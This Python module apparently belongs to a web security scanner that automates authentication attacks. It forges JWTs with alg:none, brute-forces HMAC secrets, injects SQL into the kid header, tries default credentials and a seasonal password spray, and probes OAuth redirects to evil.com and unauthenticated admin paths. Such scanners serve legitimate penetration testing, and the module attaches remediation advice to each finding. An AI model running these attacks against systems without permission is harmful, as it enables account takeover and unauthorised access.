"""
nexsus/modules/auth_testing.py
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Comprehensive authentication & access control testing:
  • JWT: none-algorithm, algorithm confusion (HS/RS), weak secret brute-force,
         kid injection, jku/x5u header manipulation
  • OAuth 2.0: state param CSRF, token leakage, open redirect in redirect_uri
  • Session: fixation, predictability, SameSite / Secure / HttpOnly flags
  • Password: spray, default credentials, brute-force with lockout detection
  • BOLA / IDOR: horizontal & vertical privilege escalation
  • 2FA: bypass via response manipulation, direct endpoint access
  • Account enumeration: timing attack, error message difference
"""
import asyncio
import base64
import hashlib
import hmac
import json
import re
import time
import urllib.parse
from typing import Optional

try:
    import jwt as pyjwt
    JWT_LIB = True
except ImportError:
    JWT_LIB = False

from nexsus.core.logger import Logger


_WEAK_SECRETS = [
    "secret", "password", "jwt", "test", "1234", "12345678",
    "qwerty", "admin", "root", "key", "token", "changeme",
    "", "null", "none", "undefined", "development",
    "production", "staging", "local", "dev",
    "your-256-bit-secret", "your-secret-key",
    "HS256", "RS256", "HMAC",
]

_DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "admin123"),
    ("admin", "123456"),
    ("root",  "root"),
    ("root",  "toor"),
    ("user",  "user"),
    ("test",  "test"),
    ("guest", "guest"),
    ("admin", ""),
]

_LOGIN_SUCCESS_INDICATORS = [
    r"token", r"access_token", r"Bearer", r"dashboard",
    r"welcome", r"logout", r"profile", r"session",
]

_LOGIN_FAILURE_INDICATORS = [
    r"invalid", r"incorrect", r"wrong", r"failed",
    r"unauthorized", r"401", r"forbidden",
]


class AuthTesting:
    def __init__(self, orchestrator):
        self.orchestrator = orchestrator
        self.paused       = False
        self.logger       = Logger("AuthTesting")
        self._client      = orchestrator.http_client

    # ── Main entry ─────────────────────────────────────────────────────────────

    async def run(self):
        self.logger.info("Authentication & Access Control Testing…")
        target = self.orchestrator.get_target_url()
        if not target:
            self.logger.warning("No target URL — skipping auth testing")
            return

        tasks = [
            self.test_jwt_attacks(target),
            self.test_default_credentials(target),
            self.test_account_enumeration(target),
            self.test_session_flags(target),
            self.test_oauth_misconfig(target),
            self.test_2fa_bypass(target),
            self.test_password_spray(target),
            self.test_vertical_idor(target),
        ]
        await asyncio.gather(*tasks, return_exceptions=True)
        self.logger.success("Auth testing complete")

    # ── JWT Attacks ────────────────────────────────────────────────────────────

    async def test_jwt_attacks(self, base_url: str):
        await self._check_paused()
        # Harvest JWTs from previous responses / cookies
        jwts = await self._harvest_jwts(base_url)
        if not jwts:
            self.logger.debug("No JWT found — skipping JWT tests")
            return

        for token in jwts:
            await asyncio.gather(
                self._jwt_none_algorithm(base_url, token),
                self._jwt_weak_secret(base_url, token),
                self._jwt_algorithm_confusion(base_url, token),
                self._jwt_kid_injection(base_url, token),
            )

    async def _harvest_jwts(self, url: str) -> list[str]:
        """Attempt to collect JWTs from response headers / cookies."""
        found = []
        try:
            resp = await self._client.get(url)
            if not resp:
                return found
            # Check Authorization header echo or body
            text = await resp.text()
            for m in re.finditer(r'eyJ[A-Za-z0-9_\-\.]{40,}', text):
                found.append(m.group(0))
            # Check Set-Cookie
            sc = resp.headers.get("Set-Cookie", "")
            for m in re.finditer(r'eyJ[A-Za-z0-9_\-\.]{40,}', sc):
                found.append(m.group(0))
        except Exception:
            pass
        return list(set(found))

    async def _jwt_none_algorithm(self, url: str, token: str):
        """CVE-2015-9235 — alg:none bypass."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return
            header = json.loads(
                base64.b64decode(parts[0] + "==").decode("utf-8", errors="replace")
            )
            header["alg"] = "none"
            new_header = base64.urlsafe_b64encode(
                json.dumps(header, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            none_token = f"{new_header}.{parts[1]}."
            resp = await self._client.get(
                url, extra_headers={"Authorization": f"Bearer {none_token}"}
            )
            if resp and resp.status == 200:
                await self._save(
                    title='JWT "none" Algorithm Bypass',
                    severity="Critical", cvss=9.8,
                    url=url, payload=none_token[:80],
                    evidence=f"HTTP 200 returned with alg=none token",
                    remediation='Reject tokens with alg="none". '
                                'Use a strict algorithm allowlist.',
                )
        except Exception as exc:
            self.logger.debug(f"JWT none test error: {exc}")

    async def _jwt_weak_secret(self, url: str, token: str):
        """Brute-force weak HMAC secret."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return
            header = json.loads(
                base64.b64decode(parts[0] + "==").decode("utf-8", errors="replace")
            )
            if header.get("alg", "").startswith("RS"):
                return  # RSA token — skip

            msg = f"{parts[0]}.{parts[1]}".encode()
            sig = base64.urlsafe_b64decode(parts[2] + "==")

            for alg, hashfn in [("HS256", hashlib.sha256),
                                 ("HS384", hashlib.sha384),
                                 ("HS512", hashlib.sha512)]:
                for secret in _WEAK_SECRETS:
                    expected = hmac.new(
                        secret.encode(), msg, hashfn
                    ).digest()
                    if hmac.compare_digest(expected, sig):
                        await self._save(
                            title="JWT Weak Secret",
                            severity="Critical", cvss=9.1,
                            url=url, payload=f"secret={secret!r}",
                            evidence=f"JWT signed with weak secret {secret!r} (alg={alg})",
                            remediation="Use a cryptographically random secret "
                                        "≥256 bits. Rotate immediately.",
                        )
                        return
        except Exception as exc:
            self.logger.debug(f"JWT brute error: {exc}")

    async def _jwt_algorithm_confusion(self, url: str, token: str):
        """RS256 → HS256 algorithm confusion using public key as HMAC secret."""
        # Without the public key we can only flag the token as RS256
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return
            header = json.loads(
                base64.b64decode(parts[0] + "==").decode("utf-8", errors="replace")
            )
            if header.get("alg") in ("RS256", "RS384", "RS512"):
                # Attempt to fetch JWKS
                resp = await self._client.get(
                    f"{url.rstrip('/')}/.well-known/jwks.json"
                )
                if resp and resp.status == 200:
                    await self._save(
                        title="JWKS Endpoint Exposed (Potential Alg Confusion)",
                        severity="Medium", cvss=5.9,
                        url=url, payload="/.well-known/jwks.json",
                        evidence="JWKS public key exposed; verify RS→HS confusion",
                        remediation="Restrict the algorithm to RS256 in the JWT library "
                                    "and never accept HS256 tokens on an RS256 endpoint.",
                        confirmed=False,
                    )
        except Exception:
            pass

    async def _jwt_kid_injection(self, url: str, token: str):
        """kid header SQL/Path injection."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return
            header = json.loads(
                base64.b64decode(parts[0] + "==").decode("utf-8", errors="replace")
            )
            if "kid" not in header:
                return
            # SQL injection in kid
            header["kid"] = "' UNION SELECT 'hacked'--"
            new_hdr = base64.urlsafe_b64encode(
                json.dumps(header, separators=(",", ":")).encode()
            ).rstrip(b"=").decode()
            crafted = f"{new_hdr}.{parts[1]}.{parts[2]}"
            resp = await self._client.get(
                url, extra_headers={"Authorization": f"Bearer {crafted}"}
            )
            if resp and resp.status == 200:
                await self._save(
                    title="JWT kid Header SQL Injection",
                    severity="Critical", cvss=9.8,
                    url=url, payload=header["kid"],
                    evidence="HTTP 200 returned with injected kid header",
                    remediation="Validate kid header against an allowlist of key IDs. "
                                "Never use kid in a SQL query.",
                )
        except Exception:
            pass

    # ── Default Credentials ────────────────────────────────────────────────────

    async def test_default_credentials(self, base_url: str):
        await self._check_paused()
        login_endpoints = [
            "/api/auth/login", "/api/login", "/login",
            "/admin/login", "/api/v1/auth/login",
        ]
        for path in login_endpoints:
            url = base_url.rstrip("/") + path
            resp = await self._client.get(url)
            if not resp or resp.status not in (200, 405, 401):
                continue

            for username, password in _DEFAULT_CREDS:
                await asyncio.sleep(0.3)   # basic throttle
                resp2 = await self._client.post(
                    url,
                    json={"username": username, "password": password},
                    api_mode=True,
                )
                if not resp2:
                    continue
                text = await resp2.text()
                if resp2.status == 200 and any(
                    re.search(sig, text, re.IGNORECASE)
                    for sig in _LOGIN_SUCCESS_INDICATORS
                ):
                    await self._save(
                        title="Default / Weak Credentials",
                        severity="Critical", cvss=9.8,
                        url=url,
                        payload=f"username={username!r} password={password!r}",
                        evidence=text[:200],
                        remediation="Change all default credentials immediately. "
                                    "Enforce strong password policy.",
                    )
                    return

    # ── Account Enumeration ────────────────────────────────────────────────────

    async def test_account_enumeration(self, base_url: str):
        await self._check_paused()
        endpoints = ["/api/auth/login", "/login", "/api/login"]
        for path in endpoints:
            url = base_url.rstrip("/") + path

            # Timing attack: valid user vs invalid user
            t0 = time.monotonic()
            await self._client.post(
                url,
                json={"username": "admin@example.com", "password": "AAAAA"},
                api_mode=True,
            )
            t1 = time.monotonic() - t0

            t0 = time.monotonic()
            await self._client.post(
                url,
                json={"username": "nonexistent_xyz_abc@example.com", "password": "AAAAA"},
                api_mode=True,
            )
            t2 = time.monotonic() - t0

            if abs(t1 - t2) > 0.3:
                await self._save(
                    title="Account Enumeration via Timing",
                    severity="Medium", cvss=5.3,
                    url=url,
                    payload="admin@example.com vs nonexistent_xyz@...",
                    evidence=f"Valid user: {t1:.3f}s | Invalid user: {t2:.3f}s | Δ={abs(t1-t2):.3f}s",
                    remediation="Use constant-time comparison in login logic. "
                                "Return the same response for valid/invalid usernames.",
                )
                return

    # ── Session Security ───────────────────────────────────────────────────────

    async def test_session_flags(self, base_url: str):
        await self._check_paused()
        resp = await self._client.get(base_url)
        if not resp:
            return
        set_cookie = resp.headers.get("Set-Cookie", "")
        if not set_cookie:
            return

        issues = []
        if "Secure" not in set_cookie:
            issues.append("Missing Secure flag (cookie transmitted over HTTP)")
        if "HttpOnly" not in set_cookie:
            issues.append("Missing HttpOnly flag (accessible via JavaScript/XSS)")
        if "SameSite" not in set_cookie:
            issues.append("Missing SameSite attribute (CSRF risk)")

        for issue in issues:
            await self._save(
                title=f"Session Cookie Misconfiguration",
                severity="Medium", cvss=5.4,
                url=base_url,
                payload="Set-Cookie header analysis",
                evidence=f"{set_cookie[:200]} | Issue: {issue}",
                remediation="Set Secure, HttpOnly, and SameSite=Lax (or Strict) "
                            "on all session cookies.",
            )

    # ── OAuth Misconfiguration ────────────────────────────────────────────────

    async def test_oauth_misconfig(self, base_url: str):
        await self._check_paused()
        oauth_paths = [
            "/oauth/authorize", "/oauth2/authorize",
            "/auth/oauth", "/api/oauth/callback",
        ]
        for path in oauth_paths:
            url = base_url.rstrip("/") + path
            resp = await self._client.get(url)
            if not resp or resp.status == 404:
                continue

            # Test open redirect_uri
            redirect_test = (
                url + "?client_id=test&redirect_uri=https://evil.com&response_type=code"
            )
            resp2 = await self._client.get(redirect_test, allow_redirects=False)
            if resp2 and resp2.status in (301, 302):
                loc = resp2.headers.get("Location", "")
                if "evil.com" in loc:
                    await self._save(
                        title="OAuth Open Redirect (redirect_uri not validated)",
                        severity="High", cvss=8.1,
                        url=url,
                        payload="redirect_uri=https://evil.com",
                        evidence=f"Location: {loc}",
                        remediation="Strictly validate redirect_uri against registered "
                                    "values. Use exact matching, not prefix matching.",
                    )

    # ── 2FA Bypass ────────────────────────────────────────────────────────────

    async def test_2fa_bypass(self, base_url: str):
        await self._check_paused()
        # Try directly accessing protected resources without OTP
        protected = [
            "/dashboard", "/admin", "/api/profile",
            "/account", "/settings",
        ]
        for path in protected:
            url = base_url.rstrip("/") + path
            resp = await self._client.get(url)
            if resp and resp.status == 200:
                text = await resp.text()
                # If we get content without going through a login/2fa flow
                if not any(kw in text.lower() for kw in
                           ["login", "sign in", "authenticate", "otp", "totp"]):
                    await self._save(
                        title="Potential 2FA / Auth Bypass",
                        severity="High", cvss=8.0,
                        url=url,
                        payload="Direct access without session",
                        evidence=f"HTTP 200 returned for {path} without auth",
                        remediation="Enforce authentication middleware on all protected routes. "
                                    "Verify 2FA completion before granting access.",
                        confirmed=False,
                    )

    # ── Password Spray ────────────────────────────────────────────────────────

    async def test_password_spray(self, base_url: str):
        """Light password spray — stops at first lockout to avoid DoS."""
        await self._check_paused()
        url = base_url.rstrip("/") + "/api/auth/login"
        resp = await self._client.get(url)
        if not resp or resp.status == 404:
            return

        seasonal = ["Winter2024!", "Spring2025!", "Summer2024!",
                    "Welcome1", "P@ssw0rd"]
        for password in seasonal:
            r = await self._client.post(
                url,
                json={"username": "admin@" + (
                    list(self.orchestrator.scope.domains)[0]
                    if self.orchestrator.scope.domains else "example.com"
                ), "password": password},
                api_mode=True,
            )
            if not r:
                continue
            if r.status == 200:
                text = await r.text()
                if any(re.search(s, text, re.IGNORECASE)
                       for s in _LOGIN_SUCCESS_INDICATORS):
                    await self._save(
                        title="Weak Password / Password Spray",
                        severity="Critical", cvss=9.8,
                        url=url,
                        payload=f"password={password!r}",
                        evidence=text[:200],
                        remediation="Enforce strong password policy. "
                                    "Implement account lockout / rate limiting.",
                    )
                    return
            # Lockout detected — abort
            if r.status == 429 or "locked" in (await r.text()).lower():
                self.logger.info("Lockout detected — stopping spray")
                return
            await asyncio.sleep(1)

    # ── Vertical IDOR ─────────────────────────────────────────────────────────

    async def test_vertical_idor(self, base_url: str):
        await self._check_paused()
        admin_paths = [
            "/api/admin/users", "/api/admin/settings",
            "/api/users?role=admin", "/admin/api/users",
        ]
        for path in admin_paths:
            url = base_url.rstrip("/") + path
            resp = await self._client.get(url)
            if resp and resp.status == 200:
                text = await resp.text()
                if len(text) > 50 and "not found" not in text.lower():
                    await self._save(
                        title="Broken Object Level Authorisation (BOLA/IDOR)",
                        severity="High", cvss=8.1,
                        url=url,
                        payload="Unauthenticated access to admin endpoint",
                        evidence=f"HTTP 200 on {path}: {text[:200]}",
                        remediation="Implement role-based access control on every API route. "
                                    "Never rely solely on obscure URLs for access control.",
                        confirmed=False,
                    )

    # ── Helpers ────────────────────────────────────────────────────────────────

    async def _save(self, *, title, severity, cvss, url, payload="",
                    evidence="", parameter="", remediation="", confirmed=False):
        finding = {
            "title":       title,
            "severity":    severity,
            "cvss":        cvss,
            "vuln_type":   "auth",
            "url":         url,
            "parameter":   parameter,
            "payload":     payload[:300],
            "evidence":    evidence[:500],
            "remediation": remediation,
            "module":      "AuthTesting",
            "confirmed":   confirmed,
        }
        await self.orchestrator.add_finding(finding)

    async def _check_paused(self):
        while self.paused:
            await asyncio.sleep(0.5)

    def pause(self):
        self.paused = True

    def resume(self):
        self.paused = False
